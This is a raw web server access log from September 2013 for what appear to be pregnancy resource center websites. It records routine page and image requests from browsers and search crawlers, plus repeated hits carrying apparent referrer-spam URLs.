168.166.80.168 - - [30/Sep/2013:12:35:26 -0700] "GET /sitebuilder/images/navbar-0-inactive-76723.png HTTP/1.1" 200 348 "http://www.lifelineprc.com/LinnCountyPRC.html" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; GTB7.5; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)" "www.lifelineprc.com"
168.166.80.168 - - [30/Sep/2013:12:35:26 -0700] "GET /sitebuilder/images/navbar-1-inactive-76832.png HTTP/1.1" 200 505 "http://www.lifelineprc.com/LinnCountyPRC.html" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; GTB7.5; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)" "www.lifelineprc.com"
168.166.80.168 - - [30/Sep/2013:12:35:26 -0700] "GET /sitebuilder/images/navbar-2-inactive-76925.png HTTP/1.1" 200 452 "http://www.lifelineprc.com/LinnCountyPRC.html" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; GTB7.5; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)" "www.lifelineprc.com"
168.166.80.168 - - [30/Sep/2013:12:35:26 -0700] "GET /sitebuilder/images/pink_petals_background-1032x518.jpg HTTP/1.1" 200 28013 "http://www.lifelineprc.com/LinnCountyPRC.html" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; GTB7.5; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)" "www.lifelineprc.com"
168.166.80.168 - - [30/Sep/2013:12:35:26 -0700] "GET /sitebuilder/images/navbar-4-active-56640.png HTTP/1.1" 200 635 "http://www.lifelineprc.com/LinnCountyPRC.html" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; GTB7.5; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)" "www.lifelineprc.com"
168.166.80.168 - - [30/Sep/2013:12:35:27 -0700] "GET /sitebuilder/images/redgirl-152x244.jpg HTTP/1.1" 200 7057 "http://www.lifelineprc.com/LinnCountyPRC.html" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; GTB7.5; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)" "www.lifelineprc.com"
5.10.83.46 - - [30/Sep/2013:12:44:22 -0700] "GET /postabortion.html HTTP/1.1" 200 2486 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)" "www.lifelinepregnancyhelp.org"
208.115.113.82 - - [30/Sep/2013:12:54:09 -0700] "GET /locations.html HTTP/1.1" 200 3905 "-" "Mozilla/5.0 (compatible; Ezooms/1.0; ezooms.bot@gmail.com)" "www.lifelinepregnancyhelp.org"
94.153.64.140 - - [30/Sep/2013:13:40:17 -0700] "GET /aboutus.html HTTP/1.1" 200 11007 "http://2kata.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; KTXN)" "www.lifelineprc.com"
94.153.64.140 - - [30/Sep/2013:13:40:18 -0700] "GET /aboutus.html HTTP/1.1" 200 11007 "http://2kata.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; KTXN)" "www.lifelineprc.com"
94.153.64.140 - - [30/Sep/2013:13:40:19 -0700] "GET /aboutus.html HTTP/1.1" 200 11007 "http://2kata.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; KTXN)" "www.lifelineprc.com"
173.252.112.112 - - [30/Sep/2013:14:14:58 -0700] "GET /assets/images/purefreedom.jpg HTTP/1.1" 206 16761 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" "www.lifelinepregnancyhelp.org"
5.10.83.11 - - [30/Sep/2013:14:57:13 -0700] "GET /locations.html HTTP/1.1" 200 2130 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)" "lifelinepregnancyhelp.org"
72.178.151.209 - - [30/Sep/2013:15:43:45 -0700] "GET /index.html HTTP/1.1" 200 2642 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36" "www.lifelinepregnancyhelp.org"
72.178.151.209 - - [30/Sep/2013:15:43:45 -0700] "GET /assets/bodyBG.jpg HTTP/1.1" 200 11603 "http://www.lifelinepregnancyhelp.org/index.html" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36" "www.lifelinepregnancyhelp.org"
72.178.151.209 - - [30/Sep/2013:15:43:46 -0700] "GET /favicon.ico HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36" "www.lifelinepregnancyhelp.org"
37.115.189.101 - - [30/Sep/2013:15:48:19 -0700] "GET /aboutus.html HTTP/1.1" 200 11007 "http://remont-komputerov-notebook.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Crazy Browser 1.0.5)" "www.lifelineprc.com"
193.106.136.36 - - [30/Sep/2013:15:48:19 -0700] "GET /aboutus.html HTTP/1.1" 200 11007 "http://good-filmstv.ucoz.ru/" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0; T312461)" "www.lifelineprc.com"
193.106.136.36 - - [30/Sep/2013:15:48:20 -0700] "GET /aboutus.html HTTP/1.1" 200 11007 "http://good-filmstv.ucoz.ru/" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0; T312461)" "www.lifelineprc.com"
37.115.189.101 - - [30/Sep/2013:15:48:21 -0700] "GET /aboutus.html HTTP/1.1" 200 11007 "http://remont-komputerov-notebook.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Crazy Browser 1.0.5)" "www.lifelineprc.com"
193.106.136.36 - - [30/Sep/2013:15:48:21 -0700] "GET /aboutus.html HTTP/1.1" 200 11007 "http://good-filmstv.ucoz.ru/" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0; T312461)" "www.lifelineprc.com"
37.115.189.101 - - [30/Sep/2013:15:48:21 -0700] "GET /aboutus.html HTTP/1.1" 200 11007 "http://remont-komputerov-notebook.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Crazy Browser 1.0.5)" "www.lifelineprc.com"
